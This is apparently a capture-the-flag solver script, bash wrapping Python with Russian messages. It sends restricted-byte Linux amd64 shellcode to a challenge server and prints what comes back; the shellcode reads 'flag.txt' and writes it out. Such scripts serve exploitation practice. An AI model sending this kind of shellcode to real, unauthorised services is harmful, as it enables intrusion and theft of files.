#!/usr/bin/env bash
set -euo pipefail

if ! command -v python3 >/dev/null 2>&1; then
  echo 'Ошибка: необходим Python 3.' >&2
  exit 1
fi

read -r -p 'Адрес сервера (ip:port): ' address

python3 - "$address" <<'PY'
import socket
import sys

address = sys.argv[1].strip()
try:
    host, port_str = address.rsplit(':', 1)
    if not host:
        raise ValueError('Пустой IP/hostname')
    port = int(port_str)
    if not 1 <= port <= 65535:
        raise ValueError('Порт вне диапазона 1..65535')
except ValueError as error:
    sys.exit(f'Неверный адрес {address!r}: {error}')

# Linux amd64: open("flag.txt"), read -> write(stdout) in a loop, exit.
shellcode = bytes.fromhex(
    '29c05048bb656c61672e74787453fe04244889e729f629d2b0020f05'
    '4189c44883ec7f4889e64489e729c029d2b27f0f0585c07e0e89c2'
    '29ffffc729c0ffc00f05ebe329ff29c0b03c0f05'
)
forbidden = {0x00, 0x0A, 0x0D, 0x20, 0x31, 0x33, 0x66}
bad = [(i, value) for i, value in enumerate(shellcode) if value in forbidden]
if bad:
    sys.exit(f'Запрещённые байты: {bad}')
if len(shellcode) > 1024:
    sys.exit('Shellcode слишком длинный')

# Паддинг не исполняется: shellcode сам завершает процесс.
payload = shellcode.ljust(1024, b'A')
print(f'Shellcode: {len(shellcode)} байт; отправка: {len(payload)} байт', flush=True)

try:
    with socket.create_connection((host.strip('[]'), port), timeout=10) as sock:
        sock.settimeout(10)
        prompt = b'Submit your shellcode >>'
        received = b''
        while prompt not in received:
            chunk = sock.recv(4096)
            if not chunk:
                sys.exit('Сервер закрыл соединение до приглашения')
            received += chunk
            if len(received) > 65536:
                sys.exit('Приглашение не найдено')
        sock.sendall(payload)
        sock.shutdown(socket.SHUT_WR)
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                sys.exit('Время ожидания ответа истекло')
            if not chunk:
                break
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()
except OSError as error:
    sys.exit(f'Ошибка соединения: {error}')
PY
